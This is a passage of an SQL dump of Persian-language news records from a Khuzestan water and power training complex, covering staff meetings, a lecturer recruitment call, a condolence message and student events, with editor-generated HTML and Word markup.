	با توجه به استقبال و رضایت عالی شرکت&zwnj;کنندگان، به نظر می&zwnj;رسد که این مدل آموزش می&zwnj;تواند نقش مؤثری در توسعه زیرساخت&zwnj;های انرژی خورشیدی ایفا کند و الگویی جدید برای آموزش&zwnj;های کاربردی در این حوزه ارائه دهد<span dir="LTR">.</span></p>
<p>
	&nbsp;</p>', '62284bbb.jpg', 1255, '1403/12/13', '8:30:36 AM', 1403, 'اسفند', 12, '13');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (62285, 1, 'fbd7d553-8a7c-4de4-b9b3-fa012cc9fbcf', 'سفر زیارتی مناطق عملیاتی جنوب کشور ویژه دانشجویان مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان برگزار گردید', '<p>
	<span style="color: rgb(119, 119, 119); font-family: primary-font, &quot;segoe ui&quot;, tahoma; font-size: 14px; text-align: justify;">به گزارش روابط عمومی مجتمع آموزشی آب و برق خوزستان، در روز جمعه مورخ ۱۴۰۳/۱۲/10 کاروان راهیان نور ویژه دانشجویان مجتمع به مناطق عملیاتی جنوب کشور اعزام شدند&nbsp;</span><span dir="LTR" style="box-sizing: border-box; color: rgb(119, 119, 119); font-family: primary-font, &quot;segoe ui&quot;, tahoma; font-size: 14px; text-align: justify;">.</span></p>
<p>
	&nbsp;</p>
', '<p>
	<span style="color: rgb(119, 119, 119); font-family: primary-font, &quot;segoe ui&quot;, tahoma; font-size: 14px; text-align: justify;">به گزارش روابط عمومی مجتمع آموزشی آب و برق خوزستان، در روز جمعه مورخ ۱۴۰۳/۱۲/10 کاروان راهیان نور ویژه دانشجویان مجتمع به مناطق عملیاتی جنوب کشور اعزام شدند&nbsp;</span><span dir="LTR" style="box-sizing: border-box; color: rgb(119, 119, 119); font-family: primary-font, &quot;segoe ui&quot;, tahoma; font-size: 14px; text-align: justify;">.</span></p>
<p>
	&nbsp;</p>
', '62285vvv.jpg', 365, '1403/12/14', '9:05:38 AM', 1403, 'اسفند', 12, '14');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (62286, 1, 'fbd7d553-8a7c-4de4-b9b3-fa012cc9fbcf', 'دیدار رئیس مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان با پرسنل به مناسبت سال نو و عید سعید فطر', '<p dir="RTL" style="text-align: justify;">
	در پی فرارسیدن سال نو و عید سعید فطر، رئیس مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان با پرسنل این مجتمع دیدار و گفتگو کرد. در این دیدار که با حضور جمعی از کارکنان و معاونین مجتمع برگزار شد، دکتر مهدی هودگر ضمن تبریک آغاز سال جدید و عید سعید فطر، از تلاش&zwnj;های بی&zwnj;وقفه و مستمر پرسنل تشکر و قدردانی کرد<span dir="LTR">.</span></p>
<p>
	&nbsp;</p>', '<p dir="RTL" style="text-align: justify;">
	در پی فرارسیدن سال نو و عید سعید فطر، رئیس مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان با پرسنل این مجتمع دیدار و گفتگو کرد. در این دیدار که با حضور جمعی از کارکنان و معاونین مجتمع برگزار شد، دکتر مهدی هودگر ضمن تبریک آغاز سال جدید و عید سعید فطر، از تلاش&zwnj;های بی&zwnj;وقفه و مستمر پرسنل تشکر و قدردانی کرد<span dir="LTR">.</span></p>
<p dir="RTL" style="text-align: justify;">
	مهدی هودگر با اشاره به دستاوردهای سال گذشته، بیان کرد: &quot;تلاش&zwnj;های شما عزیزان در سال گذشته باعث پیشرفت&zwnj;های چشمگیری در حوزه&zwnj;های آموزشی و پژوهشی شده است. ما به عنوان یک خانواده بزرگ، باید همواره در راستای ارتقاء کیفیت خدمات و آموزش&zwnj;های ارائه شده گام برداریم<span dir="LTR">.&quot;</span></p>
<p dir="RTL" style="text-align: justify;">
	وی همچنین افزود: &quot;امیدوارم در سال جدید با همت و همکاری بیشتر، بتوانیم چالش&zwnj;های پیش&zwnj;رو را پشت سر بگذاریم و به اهداف بلندمدت خود دست یابیم. عید سعید فطر فرصتی است تا با تجدید میثاق با یکدیگر، روحیه&zwnj;ای تازه بگیریم و در کنار هم برای تحقق آرمان&zwnj;هایمان تلاش کنیم<span dir="LTR">.&quot;</span></p>
<p dir="RTL" style="text-align: justify;">
	در پایان، دکتر هودگر از پرسنل خواست تا نظرات و پیشنهادات خود را برای بهبود عملکرد مجتمع ارائه دهند و تأکید کرد که مدیریت مجتمع همواره آماده شنیدن صدای کارکنان است<span dir="LTR">.</span></p>
<p>
	&nbsp;</p>', '62286salnooo.jpg', 253, '1404/1/19', '9:59:05 AM', 1404, 'فروردین', 1, '19');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (62287, 1, 'e7b6bb6e-4088-45d8-9725-d2c15ddd7cbb', 'آغاز فراخوان جذب مدرس مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان سال۱۴۰۴', '<p style="text-align: justify;">
	مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان جهت تکمیل تیم مدرسان گروه های تخصصی خود از مدرسین،اساتید٬همکاران متخصص در صنعت آب و برق و کلیه علاقه مندان به تدریس در حوزه های مرتبط دعوت به همکاری می کند.</p>
', '<p style="text-align: justify;">
	مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان جهت تکمیل تیم مدرسان گروه های تخصصی خود از مدرسین،اساتید٬همکاران متخصص در صنعت آب و برق و کلیه علاقه مندان به تدریس در حوزه های مرتبط دعوت به همکاری می کند.<br />
	کلیه علاقه مندان به همکاری می توانند رزومه علمی و کاری خود را تا ۱۵ اردیبهشت ماه در آدرس ذیل بارگذاری نمایند.:</p>
<p style="text-align: center;">
	<span style="font-size:14px;"><a href="https://kwphc.ir/LecturerReg.aspx"><span style="color:#800080;">Https://www.Kwphc.ir/LecturerReg</span></a></span></p>
<p style="text-align: justify;">
	<span style="color:#b22222;"><strong>✓</strong></span> <span style="color:#9900cc;"><strong>دپارتمان عمومی و مدیریت شامل رشته های:</strong></span><br />
	مدیریت(دولتی، مالی و بازرگانی، کسب و کار، اجرایی، آموزشی، استراتژیک و ...)، حقوق، قراردادها، اقتصاد، حسابداری، روانشناسی، جامعه شناسی، صنایع، آمار، علوم سیاسی،&nbsp; کلیه گرایش های مهندسی کامپیوتر، بیمه، کتابداری، برنامه ریزی و علوم تربیتی<br />
	<br />
	<span style="color:#b22222;"><strong>✓</strong></span><span style="color:#9900cc;"><strong> دپارتمان آموزشی تخصصی آب و آبفا و بهداشت ، ایمنی و محیط زیست شامل رشته های:</strong></span><br />
	&nbsp;مهندسی نقشه برداری در کلیه گرایش های GIS&nbsp; ، فتوگرامتری ، سنجش از دور و میکروژئودزی<br />
	مهندسی عمران در کلیه گرایش های آب ، سازه ، ساختمان ، زلزله و ژئوتکنیک<br />
	مهندسی سازه های آبی<br />
	مهندسی زمین شناسی<br />
	مهندسی HSE<br />
	مهندسی علوم آب، هیدرولوژی<br />
	مهندسی آبیاری و زهکشی<br />
	مهندسی کشاورزی گرایش سازه های آبی<br />
	رشته حقوق (آب)<br />
	<br />
	<span style="color:#b22222;"><strong>✓</strong></span> <span style="color:#9900cc;"><strong>دپارتمان برق، انرژی و نیروگاه شامل رشته های:</strong></span><br />
	&nbsp;مهندسی برق، مکانیک، الکترونیک، صنایع و گرایش های: کنترل، ابزاردقیق، سیستم های قدرت، الکترونیک، الکترونیک قدرت، مخابرات، انرژی های تجدید پذیر، مکانیک سیالات، دینامیک، کنترل و ارتعاشات</p>
<p style="text-align: center;">
	<img alt="" src="wp-content/uploads/news-images/image_220.jpeg" style="height: 1000px; width: 700px;" /></p>
', '62287JModarres.jpg', 192, '1404/2/3', '10:07:57 AM', 1404, 'اردیبهشت', 2, '3');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (62288, 1, 'fbd7d553-8a7c-4de4-b9b3-fa012cc9fbcf', 'برگزاری جلسه هماهنگی اجرای نظام صلاحیت حرفه‌ای نیروی انسانی شرکت‌های پیمانکار طرف قرارداد با شرکت‌های توزیع نیروی برق در استان', '<p style="text-align: justify;">
	<span dir="RTL" style="font-size: 11pt; line-height: 107%; font-family: Arial, sans-serif; color: black; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;">&nbsp;در تاریخ ۱۴۰۴/۰۲/۰۱ جلسه&zwnj;ای به منظور هماهنگی و بررسی اجرای نظام صلاحیت حرفه&zwnj;ای نیروی انسانی شرکت&zwnj;های پیمانکار طرف قرارداد با شرکت&zwnj;های توزیع نیروی برق استان برگزار شد. این جلسه با حضور رئیس مجتمع آموزشی و پژوهشی آب و برق خوزستان ،نماینده شرکت مادر تخصصی توانیر،نمایندگان شرکت&zwnj;های توزیع نیروی برق اهواز و استان، نمایندگان انجمن صنفی کارفرمایی شرکت&zwnj;های توزیع نیروی برق کشور و همچنین کارکنان اداره صلاحیت حرفه&zwnj;ای و آزمون ها تشکیل گردید</span></p>
', '<p dir="RTL" style="text-align: justify;">
	در تاریخ ۱۴۰۴/۰۲/۰۱ جلسه&zwnj;ای به منظور هماهنگی و بررسی اجرای نظام صلاحیت حرفه&zwnj;ای نیروی انسانی شرکت&zwnj;های پیمانکار طرف قرارداد با شرکت&zwnj;های توزیع نیروی برق استان برگزار شد. این جلسه با حضور رئیس مجتمع آموزشی و پژوهشی آب و برق خوزستان ،نماینده شرکت مادر تخصصی توانیر،نمایندگان شرکت&zwnj;های توزیع نیروی برق اهواز و استان، نمایندگان انجمن صنفی کارفرمایی شرکت&zwnj;های توزیع نیروی برق کشور و همچنین کارکنان اداره صلاحیت حرفه&zwnj;ای و آزمون ها تشکیل گردید<span dir="LTR">.</span></p>
<p dir="RTL" style="text-align: justify;">
	در این جلسه، اعضا به بررسی الزامات و استانداردهای لازم برای انجام سنجش و ارزیابی شایستگی های مشاغل فنی و تخصصی پرداختند و اهمیت رعایت این استانداردها در ارتقاء کیفیت خدمات ؛ بهره وری و افزایش ایمنی در شبکه توزیع برق مورد تأکید قرار گرفت. همچنین، نمایندگان حاضر در جلسه به تبادل نظر درباره چالش&zwnj;ها و موانع موجود در اجرای این نظام پرداخته و راهکارهای مناسبی را برای حل آن&zwnj;ها ارائه کردند<span dir="LTR">.</span></p>
<p dir="RTL" style="text-align: justify;">
	همچنین دکتر هودگر رئیس مجتمع آموزشی آب و برق خوزستان با اشاره به اهمیت این موضوع، بر لزوم همکاری نزدیک میان تمامی ذینفعان تأکید کردند و خواستار تدوین برنامه&zwnj;ای جامع برای آموزش و ارتقاء مهارت&zwnj;های نیروی انسانی شدند. ایشان همچنین بر نقش کلیدی شرکت&zwnj;های پیمانکار در تحقق اهداف نظام صلاحیت حرفه&zwnj;ای تأکید کردند و خواستار حمایت و همفکری بیشتر از سوی نهادهای مربوطه شدند<span dir="LTR">.</span></p>
', '62288bdd.jpg', 109, '1404/2/7', '11:49:49 AM', 1404, 'اردیبهشت', 2, '7');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (62289, 1, 'fbd7d553-8a7c-4de4-b9b3-fa012cc9fbcf', 'مرکز رشد شهدای صنعت آب و برق خوزستان، به عنوان شعبه منطقه‌ای پژوهشگاه نیرو معرفی شد', '<p dir="RTL" style="text-align: justify;">
	در راستای توسعه زیست&zwnj;بوم نوآوری در حوزه آب، برق و انرژی و با هدف بهره&zwnj;برداری حداکثری از ظرفیت&zwnj;های علمی و فناورانه منطقه، &laquo;مرکز رشد شهدای صنعت آب و برق خوزستان&raquo; به عنوان شعبه منطقه&zwnj;ای پژوهشگاه نیرو معرفی شد و به شبکه مراکز رشد وابسته به این پژوهشگاه ملحق گردید<span dir="LTR">.</span></p>
<p>
	&nbsp;</p>', '<p dir="RTL" style="text-align: justify;">
	در راستای توسعه زیست&zwnj;بوم نوآوری در حوزه آب، برق و انرژی و با هدف بهره&zwnj;برداری حداکثری از ظرفیت&zwnj;های علمی و فناورانه منطقه، &laquo;مرکز رشد شهدای صنعت آب و برق خوزستان&raquo; به عنوان شعبه منطقه&zwnj;ای پژوهشگاه نیرو معرفی شد و به شبکه مراکز رشد وابسته به این پژوهشگاه ملحق گردید<span dir="LTR">.</span></p>
<p dir="RTL" style="text-align: justify;">
	این اقدام طی نشستی رسمی با حضور معاونت فناوری پژوهشگاه نیرو، مدیران جذب، مالی و فناوری، مدیر مرکز رشد خوزستان و سایر مسئولین مرتبط انجام شد. در این جلسه، ضمن ارائه گزارش عملکرد مرکز رشد در دو سال گذشته، به فرآیند شناسایی، پرورش و رشد تیم&zwnj;های فناور اشاره شد که منجر به شکل&zwnj;گیری و فعالیت ۱۴ هسته فناور گردیده است. این هسته&zwnj;ها اکنون در مسیر تبدیل به شرکت&zwnj;های فناور قرار دارند<span dir="LTR">.</span></p>
<p dir="RTL" style="text-align: justify;">
	با الحاق رسمی مرکز رشد شهدای صنعت آب و برق خوزستان به پژوهشگاه نیرو، امکان بهره&zwnj;مندی از ظرفیت&zwnj;های این نهاد ملی از جمله خدمات آزمایشگاهی تخصصی، مشاوره&zwnj;های علمی و اقتصادی، مشارکت در نمایشگاه&zwnj;ها و رویدادهای تخصصی، شبکه&zwnj;سازی با نهادهای صنعت&zwnj;محور و بهره&zwnj;مندی از ظرفیت رسانه&zwnj;ای فراهم گردیده است<span dir="LTR">.</span></p>
<p>
	&nbsp;</p>', '62289ad.jpg', 1054, '1404/2/7', '11:53:22 AM', 1404, 'اردیبهشت', 2, '7');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (62290, 1, 'fbd7d553-8a7c-4de4-b9b3-fa012cc9fbcf', 'پیام تسلیت رئیس مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان در پی حادثه دلخراش بندر شهید رجایی', '<p style="text-align: justify;">
	با کمال تاسف و اندوه، حادثه دلخراش انفجار در بندر شهید رجایی بندرعباس را دریافتیم. این واقعه ناگوار، دل&zwnj;های بسیاری را در سراسر کشور به درد آورد و ما را بر آن داشت تا با مردم شریف و مقاوم این دیار همدردی کنیم.اینجانب و همکارانم در مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان، ضمن ابراز تسلیت به خانواده&zwnj;های داغدار و آسیب&zwnj;دیده، اعلام می&zwnj;داریم که در این زمان سخت و دشوار، با شما هستیم.</p>
<body id="cke_pastebin" style="position: absolute; top: 12px; width: 1px; height: 1px; overflow: hidden; right: -1000px;">
	<p>
		با کمال تاسف و اندوه، حادثه دلخراش انفجار در بندر شهید رجایی بندرعباس را دریافتیم. این واقعه ناگوار، دل&zwnj;های بسیاری را در سراسر کشور به درد آورد و ما را بر آن داشت تا با مردم شریف و مقاوم این دیار همدردی کنیم.اینجانب و همکارانم در مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان، ضمن ابراز تسلیت به خانواده&zwnj;های داغدار و آسیب&zwnj;دیده، اعلام می&zwnj;داریم که در این زمان سخت و دشوار، با شما هستیم.</p>
</body>', '<p dir="RTL" style="text-align: center;">
	بسمه تعالی</p>
<p dir="RTL" style="text-align: justify;">
	با کمال تاسف و اندوه، حادثه دلخراش انفجار در بندر شهید رجایی بندرعباس را دریافتیم. این واقعه ناگوار، دل&zwnj;های بسیاری را در سراسر کشور به درد آورد و ما را بر آن داشت تا با مردم شریف و مقاوم این دیار همدردی کنیم.اینجانب و همکارانم در مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان، ضمن ابراز تسلیت به خانواده&zwnj;های داغدار و آسیب&zwnj;دیده، اعلام می&zwnj;داریم که در این زمان سخت و دشوار، با شما هستیم.</p>
<p dir="RTL" style="text-align: center;">
	<span style="text-align: center;">وَبَشِّرِ الصَّابرِینَ الَّذینَ إِذَا أَصَابَتْهُمْ مُصِیبَهٌ قَالُوا إِنَّا لِلَّهِ وَ إِنَّا إِلَیْهِ رَاجِعُونَ</span></p>
<p dir="RTL" style="text-align: justify;">
	&nbsp;بی&zwnj;تردید، صبر و استقامت مردم بندرعباس در برابر این مصیبت بزرگ ستودنی است و ما به عنوان یک ملت، همواره در کنار یکدیگر خواهیم بود. امیدوارم که خداوند متعال به بازماندگان صبر و شکیبایی عطا فرماید و روح درگذشتگان را قرین رحمت و مغفرت خویش قرار دهد.</p>
<p dir="RTL" style="text-align: center;">
	&nbsp;</p>
<p dir="RTL" style="text-align: center;">
	با احترام و همدردی</p>
<p dir="RTL" style="text-align: center;">
	مهدی هودگر&nbsp;</p>
<p dir="RTL" style="text-align: center;">
	رئیس مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان</p>
<p>
	&nbsp;</p>', '62290bandar.jpg', 125, '1404/2/8', '10:44:45 AM', 1404, 'اردیبهشت', 2, '8');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (62291, 1, 'fbd7d553-8a7c-4de4-b9b3-fa012cc9fbcf', 'برگزاری دوره توانمندسازی دانشجویان فعال فرهنگی، اجتماعی و سیاسی در خوزستان تحت عنوان «حلقه‌های میانی؛ حامیم»', '<p dir="RTL" style="text-align: justify;">
	به همت نهاد نمایندگی مقام معظم رهبری در دانشگاه علمی کاربردی استان خوزستان و با همکاری و میزبانی مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان، دوره توانمندسازی دانشجویان فعال فرهنگی، سیاسی و اجتماعی با عنوان &laquo;حلقه&zwnj;های میانی؛ حامیم&raquo; برگزار شد. این دوره با هدف ارتقای آگاهی و مهارت&zwnj;های دانشجویان در زمینه&zwnj;های مختلف اجتماعی و فرهنگی طراحی شده است<span dir="LTR">. </span></p>', '<p dir="RTL" style="text-align: justify;">
	به همت نهاد نمایندگی مقام معظم رهبری در دانشگاه علمی کاربردی استان خوزستان و با همکاری و میزبانی مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان، دوره توانمندسازی دانشجویان فعال فرهنگی، سیاسی و اجتماعی با عنوان &laquo;حلقه&zwnj;های میانی؛ حامیم&raquo; برگزار شد. این دوره با هدف ارتقای آگاهی و مهارت&zwnj;های دانشجویان در زمینه&zwnj;های مختلف اجتماعی و فرهنگی طراحی شده است<span dir="LTR">. </span></p>
<p dir="RTL" style="text-align: justify;">
	محورهای اصلی این دوره شامل موضوعات مهمی نظیر &quot;گام دوم انقلاب&quot;، &quot;جوانان پیشرو&quot;، &quot;مسئولیت و سازندگی&quot;، &quot;مشاوره توسعه کسب و کار&quot;، &quot;دشمن&zwnj;شناسی<span dir="LTR">&quot;</span>، <span dir="LTR">&quot;</span>کار باید تشکیلاتی باشد&quot; و &quot;توسعه فردی&quot; بود که به منظور تقویت روحیه فعالیت&zwnj;های اجتماعی و فرهنگی در بین جوانان برنامه&zwnj;ریزی شده بود<span dir="LTR">. </span></p>
<p dir="RTL" style="text-align: justify;">
	افتتاحیه این دوره با حضور دکتر بهرهی، رئیس دانشگاه جامع علمی کاربردی استان خوزستان و دکتر هودگر، رئیس مجتمع آموزشی پژوهشی صنعت آب و برق خوزستان برگزار شد<span dir="LTR">. </span></p>
<p dir="RTL" style="text-align: justify;">
	در ابتدای برنامه، دکتر مهدی هودگر ضمن خوش آمدگویی به شرکت&zwnj;کنندگان، ابراز افتخار کرد که مجتمع آموزشی آب و برق میزبان این دوره است. وی به اهمیت بیانیه گام دوم انقلاب اشاره کرده و گفت: &laquo;این بیانیه نقشه راهی برای جوانان است تا در مسیر پیشرفت کشور گام بردارند.&raquo; همچنین، وی از تلاش&zwnj;های امور فرهنگی مجتمع برای برنامه&zwnj;ریزی و اجرای این طرح قدردانی کرد و بر لزوم همکاری همه&zwnj;جانبه برای تحقق اهداف فرهنگی تأکید کرد<span dir="LTR">. </span></p>
<p dir="RTL" style="text-align: justify;">
	در ادامه، دکتر بهرهی نیز به ظرفیت&zwnj;های دانشگاه&zwnj;های استان اشاره کرد و بر اهمیت برگزاری این دوره تأکید نمود. وی گفت: &laquo;دانشجویان باید با آگاهی از مسائل روز جامعه، نقش موثری در توسعه کشور ایفا کنند و این دوره می&zwnj;تواند به تقویت روحیه فعالیت&zwnj;های اجتماعی و فرهنگی در بین جوانان کمک کند<span dir="LTR">.&raquo; </span></p>
<p dir="RTL" style="text-align: justify;">
	پس از افتتاحیه، کارگاه&zwnj;های آموزشی به ترتیب برنامه اجرا شد. کارگاه نخست با حضور حجت الاسلام عادلی نژاد، مسئول نهاد نمایندگی مقام معظم رهبری در دانشگاه&zwnj;های استان خوزستان برگزار شد. سپس کارگاه دوم با حضور حجت الاسلام حاجتی، استاد حوزه و دانشگاه و امام جمعه موقت اهواز ادامه یافت. کارگاه سوم نیز با حضور حجت الاسلام سمیع، مسئول نهاد رهبری دانشگاه جامع علمی کاربردی استان خوزستان برگزار گردید<span dir="LTR">. </span></p>
<p dir="RTL" style="text-align: justify;">
	کارگاه چهارم به ارائه مهندس حسین معاونی اختصاص داشت. وی مجری اسبق توسعه زنجیره&zwnj;های ارزش اقتصادی استان خوزستان، مدیر سابق پروژه&zwnj;های اقتصادی جنوب غرب بنیاد علوی و مدیر کانون اشتغال آستان قدس رضوی بود. مهندس معاونی در این کارگاه به بررسی چالش&zwnj;ها و فرصت&zwnj;های موجود در زمینه توسعه کسب و کار پرداخت<span dir="LTR">. </span></p>
<p dir="RTL" style="text-align: justify;">
	در بین برنامه&zwnj;ها، اقامه نماز ظهر و عصر، تلاوت قرآن و صرف ناهار نیز برای شرکت&zwnj;کنندگان فراهم شد. همچنین دورهمی جوانان پیشرو با حضور محمدعلی رستمی، معاون جوانان اداره کل ورزش و جوانان استان خوزستان برگزار گردید که فضایی برای تبادل نظر و گفتگو میان جوانان فراهم آورد<span dir="LTR">.</span></p>
<p>
	&nbsp;</p>', '62291photoooo.jpg', 127, '1404/2/14', '12:57:19 AM', 1404, 'اردیبهشت', 2, '14');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (62292, 1, 'fbd7d553-8a7c-4de4-b9b3-fa012cc9fbcf', 'تجلیل از اساتید مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان به مناسبت روز معلم', '<p dir="RTL" style="text-align: justify;">
	به مناسبت روز معلم، مدیران مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان با حضور در کلاس&zwnj;های درس، از زحمات و تلاش&zwnj;های اساتید تجلیل کردند<span dir="LTR">. </span>این اقدام با هدف قدردانی از نقش کلیدی معلمان در تربیت نسل آینده و ارتقاء سطح علمی دانشجویان انجام شد<span dir="LTR">. </span></p>
<p>
	&nbsp;</p>', '<p dir="RTL" style="text-align: justify;">
	به مناسبت روز معلم، مدیران مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان با حضور در کلاس&zwnj;های درس، از زحمات و تلاش&zwnj;های اساتید تجلیل کردند<span dir="LTR">. </span>این اقدام با هدف قدردانی از نقش کلیدی معلمان در تربیت نسل آینده و ارتقاء سطح علمی دانشجویان انجام شد<span dir="LTR">. </span></p>
<p dir="RTL" style="text-align: justify;">
	مدیران با حضور در کلاس&zwnj;ها، ضمن ابراز احترام به مقام معلم، به اساتید لوح تقدیر و شاخه گل اهدا کردند. این حرکت نمادی از ارادت و قدردانی جامعه علمی به زحمات بی&zwnj;وقفه اساتید بود<span dir="LTR">. </span></p>
<p dir="RTL" style="text-align: justify;">
	اساتید نیز در این دیدارها، از توجه و حمایت مدیران قدردانی کردند و بر اهمیت نقش خود در آموزش و پرورش دانشجویان تأکید کردند<span dir="LTR">.</span></p>
<p>
	&nbsp;</p>', '62292ostad.jpg', 162, '1404/2/14', '1:04:53 AM', 1404, 'اردیبهشت', 2, '14');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (62293, 1, 'fbd7d553-8a7c-4de4-b9b3-fa012cc9fbcf', 'اردوی راهیان پیشرفت؛ فرصتی برای ارتقای خودباوری و آشنایی با دستاوردهای صنعت آب و برق', '<p dir="RTL" style="text-align: justify;">
	به گزارش روابط عمومی مجتمع آموزشی آب و برق خوزستان، اردوی راهیان پیشرفت با هدف ارتقای خودباوری، امیدآفرینی و تقویت اراده با حضور جمعی از دانشجویان و کارکنان مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان برگزار شد. این اردو در محل شرکت آب جنوب شرق و با همکاری این شرکت برگزار گردید<span dir="LTR">. </span></p>
<p>
	&nbsp;</p>', '<p>
	<!--[if gte mso 9]><xml>
 <o:OfficeDocumentSettings>
  <o:AllowPNG/>
 </o:OfficeDocumentSettings>
</xml><![endif]--><!--[if gte mso 9]><xml>
 <w:WordDocument>
  <w:View>Normal</w:View>
  <w:Zoom>0</w:Zoom>
  <w:TrackMoves/>
  <w:TrackFormatting/>
  <w:PunctuationKerning/>
  <w:ValidateAgainstSchemas/>
  <w:SaveIfXMLInvalid>false</w:SaveIfXMLInvalid>
  <w:IgnoreMixedContent>false</w:IgnoreMixedContent>
  <w:AlwaysShowPlaceholderText>false</w:AlwaysShowPlaceholderText>
  <w:DoNotPromoteQF/>
  <w:LidThemeOther>EN-US</w:LidThemeOther>
  <w:LidThemeAsian>X-NONE</w:LidThemeAsian>
  <w:LidThemeComplexScript>AR-SA</w:LidThemeComplexScript>
  <w:Compatibility>
   <w:BreakWrappedTables/>
   <w:SnapToGridInCell/>
   <w:WrapTextWithPunct/>
   <w:UseAsianBreakRules/>
   <w:DontGrowAutofit/>
   <w:SplitPgBreakAndParaMark/>
   <w:EnableOpenTypeKerning/>
   <w:DontFlipMirrorIndents/>
   <w:OverrideTableStyleHps/>
  </w:Compatibility>
  <m:mathPr>
   <m:mathFont m:val="Cambria Math"/>
   <m:brkBin m:val="before"/>
   <m:brkBinSub m:val="&#45;-"/>
   <m:smallFrac m:val="off"/>
   <m:dispDef/>
   <m:lMargin m:val="0"/>
   <m:rMargin m:val="0"/>
   <m:defJc m:val="centerGroup"/>
   <m:wrapIndent m:val="1440"/>
   <m:intLim m:val="subSup"/>
   <m:naryLim m:val="undOvr"/>
  </m:mathPr></w:WordDocument>
</xml><![endif]--><!--[if gte mso 9]><xml>
 <w:LatentStyles DefLockedState="false" DefUnhideWhenUsed="false"
  DefSemiHidden="false" DefQFormat="false" DefPriority="99"
  LatentStyleCount="376">
  <w:LsdException Locked="false" Priority="0" QFormat="true" Name="Normal"/>
  <w:LsdException Locked="false" Priority="9" QFormat="true" Name="heading 1"/>
  <w:LsdException Locked="false" Priority="9" SemiHidden="true"
   UnhideWhenUsed="true" QFormat="true" Name="heading 2"/>
  <w:LsdException Locked="false" Priority="9" SemiHidden="true"
   UnhideWhenUsed="true" QFormat="true" Name="heading 3"/>
  <w:LsdException Locked="false" Priority="9" SemiHidden="true"
   UnhideWhenUsed="true" QFormat="true" Name="heading 4"/>
  <w:LsdException Locked="false" Priority="9" SemiHidden="true"
   UnhideWhenUsed="true" QFormat="true" Name="heading 5"/>
  <w:LsdException Locked="false" Priority="9" SemiHidden="true"
   UnhideWhenUsed="true" QFormat="true" Name="heading 6"/>
  <w:LsdException Locked="false" Priority="9" SemiHidden="true"
   UnhideWhenUsed="true" QFormat="true" Name="heading 7"/>
  <w:LsdException Locked="false" Priority="9" SemiHidden="true"
   UnhideWhenUsed="true" QFormat="true" Name="heading 8"/>
  <w:LsdException Locked="false" Priority="9" SemiHidden="true"
   UnhideWhenUsed="true" QFormat="true" Name="heading 9"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="index 1"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="index 2"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="index 3"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="index 4"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="index 5"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="index 6"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="index 7"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="index 8"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="index 9"/>
  <w:LsdException Locked="false" Priority="39" SemiHidden="true"
   UnhideWhenUsed="true" Name="toc 1"/>
  <w:LsdException Locked="false" Priority="39" SemiHidden="true"
   UnhideWhenUsed="true" Name="toc 2"/>
  <w:LsdException Locked="false" Priority="39" SemiHidden="true"
   UnhideWhenUsed="true" Name="toc 3"/>
  <w:LsdException Locked="false" Priority="39" SemiHidden="true"
   UnhideWhenUsed="true" Name="toc 4"/>
  <w:LsdException Locked="false" Priority="39" SemiHidden="true"
   UnhideWhenUsed="true" Name="toc 5"/>
  <w:LsdException Locked="false" Priority="39" SemiHidden="true"
   UnhideWhenUsed="true" Name="toc 6"/>
  <w:LsdException Locked="false" Priority="39" SemiHidden="true"
   UnhideWhenUsed="true" Name="toc 7"/>
  <w:LsdException Locked="false" Priority="39" SemiHidden="true"
   UnhideWhenUsed="true" Name="toc 8"/>
  <w:LsdException Locked="false" Priority="39" SemiHidden="true"
   UnhideWhenUsed="true" Name="toc 9"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="Normal Indent"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="footnote text"/>
